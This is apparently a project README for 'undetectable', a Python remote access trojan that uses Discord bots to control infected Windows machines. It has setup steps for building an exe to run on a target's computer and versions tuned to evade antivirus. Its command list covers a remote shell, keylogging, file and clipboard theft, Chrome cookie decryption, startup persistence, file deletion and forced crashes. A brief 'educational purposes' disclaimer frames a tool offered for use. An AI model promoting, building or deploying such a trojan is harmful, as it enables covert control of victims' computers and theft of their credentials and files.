![image](https://github.com/user-attachments/assets/96b66c4f-7d59-440e-ba8d-0fce89b4be4a)


undetectable is a computer virus written in Python that utilizes Discord bots to transmit information. Please note that this program was created solely for educational purposes, and it should not be used to engage in any illegal activities. The use of undetectable may have severe legal consequences, including the banning of your Discord account. Download and use this program responsibly.
to put it simply, undetectable can be compared to meterpreter from metasploit
only undetectable works outside the local network and transmits data via discord
and slightly different functions

[For more information and instructions, visit the XDA Developers forum thread](https://forum.xda-developers.com/t/undetectable-hack-discord-bots.4622267/).

## How to Use

1. Install Python from the [official website](https://www.python.org/downloads/).
2. Download the files from this repository.
3. Open a command prompt on Windows or a terminal on Linux and run python setup.py. If that doesn't work, try py setup.py. or if you are on windows you can just click on setup.bat
4. Follow the instructions provided.
5. if the program compiles to exe. just enable it on the computer you want to control

## Platforms
the program was written for windows, so a large amount may not work on normal linux, and even more so on termux or mac. it is possible that in the future there will be an adaptation of undetectable to more platforms

## Versions
you can choose the versions at setup
- `undetectable_minimal.py` - the minimal version, the hardest to detect, has only reverse shell functions
- `undetectable_lite.py` - has everything that the minimum version has, but unlike it, it can upload files and steal them, it has the function of taking screenshots, it can be slightly more detected by antiviruses
- `undetectable.py` - it has all the features but antiviruses often detect it
## Commands

The following commands can be used with undetectable:

- `!shell [session] [output(yes, no)] [command]`: Executes a shell command on a remote computer. `all versions`
- `!ss [session]`: Captures a screenshot from a remote computer. `undetectable.py and undetectable lite`
- `!keylogger [session] [action(start, stop, log)]`: Starts or stops a keylogger on a remote computer. `only in undetectable.py`
- `!steal [session] [file_names]`: Steals files from a remote computer. `undetectable.py and undetectable lite`
- `!info [session]`: Retrieves information about the remote computer system. `only in undetectable.py`
- `!cd [session] [path]`: Changes the current directory on the remote computer. `all versions`
- `!up [session]`: Increases the volume on the remote computer. `only in undetectable.py`
- `!down [session]`: Decreases the volume on the remote computer. `only in undetectable.py`
- `!message [session] [title] [button] [message]`: Displays a message on the remote computer.`only in undetectable.py`
- `!dir [session]`: Displays the current directory on the remote computer. `all versions`
- `!upload [session] [link] [file_name]`: Sends a file to the remote computer. `undetectable.py and undetectable lite`
- `!click [session] [x] [y]`: Clicks at a specific location on the screen. `only in undetectable.py`
- `!press [session] [key]`: Presses a specific key (default: Enter). `only in undetectable.py`
- `!cli [session]`: Copies the clipboard content. `only in undetectable.py`
- `!write [session] [message]`: Types using the keyboard. `only in undetectable.py`
- `!loc [session]`: Displays IP information. `only in undetectable.py`
- `!cdrom [session]`: Opens the CD-ROM drive. `only in undetectable.py`
- `!sessions`: Displays all sessions. `all versions`
- `!rename [session] [new_name]`: Changes the name of a session. `all versions`
- `!shutdown [session]`: Shuts down the remote computer. `all versions`
- `!startup [session] [file path]`: copy file to startup folder (you can copy undetectable exe file) `only in undetectable.py`
- `!restart [session]` - Restart the remote computer. `all versions`
- `!chrome [session] [action(cookie)]` - steals selected data from chrome `only in undetectable.py`
- `!delete [session] [path]` - Deletes a file from the remote computer. `all versions`
- `!wallpaper [session] [path]` - changes the wallpaper on the remote computer. `only in undetectable.py`
- `!kill [session] [task]` - remote task killing. `all versions`
- `!bsod [session]` - display bsod(blue screan of death). `only in undetectable.py`
## Libraries Used

The following libraries are used in undetectable:

- `os`: Execution of system commands.
- `threading`: Launching a keylogger in another thread.
- `time`: Pausing the program for a specific duration using the sleep function.
- `zipfile`: Zipping data.
- `discord.py`: Communicating with Discord.
- `pyautogui`: Providing various functions related to user interface automation.
- `requests`: Communicating with other websites.
- `keyboard`: Operating the keyboard.
- `base64`: Encoding the token and program.
- `codecs`: Encoding the token and program.
- `sys`: Running Python commands.
- `pyperclip`: Stealing data from the clipboard.
- `subprocess`: Performing system functions.
- `platform`: Recognizing the platform.
- `shutil`: Copy files to startup.
- `sqlite3`: Opening a Chrome cookie file.
- `json`: Getting the decryption key.
- `win32crypt`: Decrypting cookies.
- `Cryptodome.Cipher`: Decrypting cookies.
- `ctypes`: change wallpaper and display bsod.


---

Please exercise caution and use this program responsibly. Remember that engaging in any illegal activities can result in serious consequences.
